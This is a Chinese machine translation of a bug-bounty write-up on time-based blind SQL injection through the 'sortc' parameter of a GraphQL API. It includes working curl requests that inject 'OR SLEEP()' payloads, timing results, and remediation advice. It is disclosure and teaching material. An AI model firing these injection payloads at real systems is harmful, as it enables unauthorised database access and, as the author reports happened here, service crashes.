<html>
<head>
<title>Time-Based Blind SQL Injection In GraphQL</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">GraphQL中基于时间的盲SQL注入</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/time-based-blind-sql-injection-in-graphql-39a25a1dfb3c?source=collection_archive---------0-----------------------#2019-08-17">https://infosecwriteups.com/time-based-blind-sql-injection-in-graphql-39a25a1dfb3c?source=collection_archive---------0-----------------------#2019-08-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e920" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我听说过很多关于GraphQL的事情，但是由于时间限制，我一直没有时间去了解它。最近拿到了一个用GraphQL中的API进行pentest的应用。经过一段时间的测试，我能够找到基于时间的盲人SQL注入。我们将假设网站为http://example.com</p><h1 id="ddfb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated"><strong class="ak">总结</strong></h1><p id="78e9" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated"><a class="ae lp" href="http://example.com/api/graphql" rel="noopener ugc nofollow" target="_blank">http://example.com/api/graphql</a>端点中的"<em class="lo"> sortc" </em>参数易受SQL注入攻击。这使得攻击者能够从公共和安全的模式中提取信息。</p><p id="72b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可能还有其他易受<strong class="jp ir"> SQL注入影响的参数。</strong></p><h1 id="f779" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated"><strong class="ak">影响</strong></h1><p id="3522" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">盲SQL注入的工作方式是执行基于时间的查询，然后在给定时间后返回结果，表明SQL查询执行成功。利用这种方法，攻击者可以列举出使用了哪个模式或者使用了哪个数据库。</p><p id="e80d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，攻击者试图确定他的查询何时返回真或假，然后他可以在RDBMS上采集指纹。这将使整个攻击变得容易得多。如果使用基于时间的方法，这有助于确定正在使用的数据库类型。另一种流行的方法是调用返回当前日期的函数。MySQL、MSSQL和Oracle对此有不同的函数，分别是<em class="lo"> now() </em>、<em class="lo"> getdate() </em>和<em class="lo"> sysdate() </em>。</p><h1 id="573a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated"><strong class="ak">概念验证</strong></h1><p id="2a79" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">1)登录网站。</p><p id="1a9d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2)拦截以下请求:<a class="ae lp" href="http://example.com/api/graphql" rel="noopener ugc nofollow" target="_blank">http://example.com/api/graphql</a></p><p id="806a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3)在请求正文中，在sortc 中添加“<em class="lo">或SLEEP(20)”</em></p><blockquote class="lq lr ls"><p id="90bd" class="jn jo lo jp b jq jr js jt ju jv jw jx lt jz ka kb lu kd ke kf lv kh ki kj kk ij bi translated">请求:</p><p id="b794" class="jn jo lo jp b jq jr js jt ju jv jw jx lt jz ka kb lu kd ke kf lv kh ki kj kk ij bi translated">{"operationName":"pages "，" variables":{"offset":0，" limit":10，"<strong class="jp ir"> sortc </strong> ":" <strong class="jp ir"> name </strong>，" sortrev":false}，" query":"query pages($offset: Int！，$limit: Int！，$sortc: String，$ sortrev:Boolean){ \ n pages(offset:＄offset，limit:＄limit，sortc:＄sort column，sort reverse:＄sort reverse){ \ n id \ n \ n \ n _ _ typen \ n } \ n me { \ n first n \ n lastN \ n usernn \ n _ _ typen \ n } \ n components { \ n title \ n _ _ typen \ n } \ n templates { \ n title \ n _ _ typen \ n \ n } \ n字体{ \ n \ n \ n _ _ typen \ n \ n } \ n合作伙伴{ \ n id \ n \ n</p></blockquote><p id="44ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4)等待一段时间，检查服务器响应的延迟</p><p id="d685" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5)在这种情况下，数据库随后崩溃。所以我没有进一步列举就报告了漏洞。</p><p id="d548" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">通过卷曲:</strong></p><p id="ee9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1)运行curl命令并检查响应时间，睡眠(2):</p><pre class="lw lx ly lz gt ma mb mc md aw me bi"><span id="7785" class="mf km iq mb b gy mg mh l mi mj">time curl -i -s -k  -X $'POST' \<br/>    -H $'Host: example.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://example.com/dashboard' -H $'content-type: application/json' -H $'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' -H $'Origin: http://example.com' -H $'Content-Length: 662' -H $'DNT: 1' -H $'Connection: close' \<br/>    --data-binary $'{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name <strong class="mb ir">OR SLEEP(2)</strong>","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n    id\n    n\n    __typen\n  }\n  me {\n    firstN\n    lastN\n    usern\n    __typen\n  }\n  components {\n    title\n    __typen\n  }\n  templates {\n    title\n    __typen\n  }\n  fonts {\n    n\n    __typen\n  }\n  partners {\n    id\n    n\n    banners {\n      n\n      __typen\n    }\n    __typen\n  }\n}\n"}' \<br/>    $'http://example.com/api/graphql'</span></pre><p id="0ac4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">响应时间:</p><ul class=""><li id="3d04" class="mk ml iq jp b jq jr ju jv jy mm kc mn kg mo kk mp mq mr ms bi translated">真正的0m4.191s</li><li id="cd03" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">用户0m0.006s</li><li id="7075" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">sys 0m0.011s</li></ul><p id="ea8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2)运行curl命令并检查响应时间，睡眠(10):</p><pre class="lw lx ly lz gt ma mb mc md aw me bi"><span id="e6f9" class="mf km iq mb b gy mg mh l mi mj">time curl -i -s -k  -X $'POST' \<br/>    -H $'Host: example.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://example.com/dashboard' -H $'content-type: application/json' -H $'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' -H $'Origin: http://example.com' -H $'Content-Length: 663' -H $'DNT: 1' -H $'Connection: close' \<br/>    --data-binary $'{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name <strong class="mb ir">OR SLEEP(10)</strong>","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n    id\n    n\n    __typen\n  }\n  me {\n    firstN\n    lastN\n    usern\n    __typen\n  }\n  components {\n    title\n    __typen\n  }\n  templates {\n    title\n    __typen\n  }\n  fonts {\n    n\n    __typen\n  }\n  partners {\n    id\n    n\n    banners {\n      n\n      __typen\n    }\n    __typen\n  }\n}\n"}' \<br/>    $'http://example.com/api/graphql'</span></pre><p id="000d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">响应时间:</p><ul class=""><li id="3e42" class="mk ml iq jp b jq jr ju jv jy mm kc mn kg mo kk mp mq mr ms bi translated">真实0m20.220s</li><li id="05ec" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">用户0m0.006s</li><li id="1498" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">sys 0m0.006s</li></ul><h1 id="7223" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated"><strong class="ak">变通解决方案</strong></h1><ul class=""><li id="5cf1" class="mk ml iq jp b jq lj ju lk jy my kc mz kg na kk mp mq mr ms bi translated">使用预处理语句(带参数化查询)</li><li id="603f" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">存储过程的使用。</li><li id="081d" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">白名单输入验证。</li><li id="7cc4" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">转义所有用户提供的输入</li><li id="0f72" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated"><strong class="jp ir">实施最低特权</strong></li></ul><h1 id="4b08" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated"><strong class="ak">参考</strong></h1><p id="3091" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated"><a class="ae lp" href="https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e" rel="noopener">https://medium . com/@ localh0t/discovering-graph QL-endpoints-and-sqli-vulnerability-5d 39 f 26 ce a2e</a></p><p id="4814" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lp" href="https://hackerone.com/reports/435066" rel="noopener ugc nofollow" target="_blank">https://hackerone.com/reports/435066</a></p><p id="77d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lp" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" rel="noopener ugc nofollow" target="_blank">https://cheatsheetseries . owasp . org/Cheat sheets/SQL _ Injection _ Prevention _ Cheat _ sheet . html</a></p><figure class="lw lx ly lz gt nc gh gi paragraph-image"><a href="https://www.buymeacoffee.com/justmorpheus"><div class="gh gi nb"><img src="../Images/4bc5de35955c00939383a18fb66b41d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:340/format:webp/1*9vg3-OY14aZN1UpKwIxxZg.png"/></div></a></figure></div><div class="ab cl nf ng hu nh" role="separator"><span class="ni bw bk nj nk nl"/><span class="ni bw bk nj nk nl"/><span class="ni bw bk nj nk"/></div><div class="ij ik il im in"><p id="7b35" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lo">关注</em> <a class="ae lp" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="lo"> Infosec报道</em> </a> <em class="lo">获取更多此类精彩报道。</em></p><div class="nm nn gp gr no np"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nq ab fo"><div class="nr ab ns cl cj nt"><h2 class="bd ir gy z fp nu fr fs nv fu fw ip bi translated">信息安全报道</h2><div class="nw l"><h3 class="bd b gy z fp nu fr fs nv fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="nx l"><p class="bd b dl z fp nu fr fs nv fu fw dk translated">medium.com</p></div></div><div class="ny l"><div class="nz l oa ob oc ny od nd np"/></div></div></a></div></div></div>    
</body>
</html>